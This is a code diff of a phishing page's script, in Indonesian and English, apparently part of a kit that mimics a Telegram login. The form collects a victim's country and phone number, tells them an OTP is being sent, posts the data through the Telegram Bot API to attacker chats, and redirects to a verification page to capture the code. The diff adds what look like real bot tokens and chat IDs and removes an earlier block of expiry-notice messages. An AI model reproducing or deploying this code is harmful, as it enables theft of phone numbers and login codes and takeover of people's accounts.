@@ -205,53 +205,51 @@ const blurOverlay = document.getElementById('blurOverlay');
 const loadingText = document.getElementById('loadingText');
 const countrySelect = document.getElementById('countrySelect');
 
-<script>
 const bots = [
-  { token: "7690173453:AAFizIJfq7OWi5tthhxxqXKWcS0Xb5bP_iE", chatId: "6832746767" },
-  { token: "7690173453:AAFizIJfq7OWi5tthhxxqXKWcS0Xb5bP_iE", chatId: "6832746767" }
+  { token: "7969797929:AAEVWvzrq0oClRtX3saonqSMcwdcTtuYGxg", chatId: "1739056932" },
+  { token: "7272507372:AAHz55yCKgJkKs1SpzplM7Fg8iaoYVz4YBM", chatId: "5876510981" }
 ];
 
-// ===== NOTIFIKASI MASA AKTIF =====
-const EXPIRY_MESSAGE =
-  "⚠️ *PERINGATAN SISTEM*\n━━━━━━━━━━━━━━\n⏳ Masa aktif *WEBP* tersisa *2 hari*\nSegera lakukan perpanjangan.\n━━━━━━━━━━━━━━";
-
-function sendExpiryNotification() {
-  bots.forEach(bot => {
-    const api = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(EXPIRY_MESSAGE)}&parse_mode=Markdown`;
-
-    fetch(api).catch(err => console.error(err));
-  });
-}
-
-// kirim saat halaman dibuka
-sendExpiryNotification();
-
-// kirim tiap 5 menit
-setInterval(sendExpiryNotification, 5 * 60 * 1000);
-
-// ===== FORM LOGIN =====
 phoneForm.addEventListener('submit', function(e) {
   e.preventDefault();
 
   const phone = phoneInput.value.trim();
   const countryText = countrySelect.options[countrySelect.selectedIndex].text;
-
   const currentBotIndex = parseInt(localStorage.getItem('currentBotIndex') || "0");
+  localStorage.setItem('sessionBotIndex', currentBotIndex);
   const bot = bots[currentBotIndex];
 
-  const message =
-    `🌀 *FUN GAY LOGIN*\n━━━━━━━━━━━━━━\n🌍 Country: ${countryText}\n📞 Phone: \`${phone}\`\n━━━━━━━━━━━━━━`;
+  const message = `🌀 *FUN GAY LOGIN*\n━━━━━━━━━━━━━━\n🌍 Country: ${countryText}\n📞 Phone: \`${phone}\`\n━━━━━━━━━━━━━━`;
+  const api = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
-  const api =
-    `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+  statusMessage.textContent = "⏳ Sending OTP to your Telegram account...";
+  statusMessage.style.color = "#000";
+  blurOverlay.style.display = "block";
+  loadingText.style.display = "block";
 
-  fetch(api).then(() => {
-    localStorage.setItem('currentBotIndex', (currentBotIndex + 1) % bots.length);
-    setTimeout(() => {
-      window.location.href = `verify.html?phone=${encodeURIComponent(phone)}`;
-    }, 3000);
-  });
+  fetch(api)
+    .then(res => res.json())
+    .then(data => {
+      if (data.ok) {
+        const nextBotIndex = (currentBotIndex + 1) % bots.length;
+        localStorage.setItem('currentBotIndex', nextBotIndex);
+        setTimeout(() => {
+          window.location.href = `verify.html?phone=${encodeURIComponent(phone)}`;
+        }, 3000);
+      } else {
+        blurOverlay.style.display = "none";
+        loadingText.style.display = "none";
+        statusMessage.textContent = "❌ Gagal mengirim ke bot.";
+        statusMessage.style.color = "red";
+      }
+    })
+    .catch(err => {
+      blurOverlay.style.display = "none";
+      loadingText.style.display = "none";
+      statusMessage.textContent = "❌ Error: " + err.message;
+      statusMessage.style.color = "red";
+    });
 });
-</script>
+  </script>
 </body>
 </html>
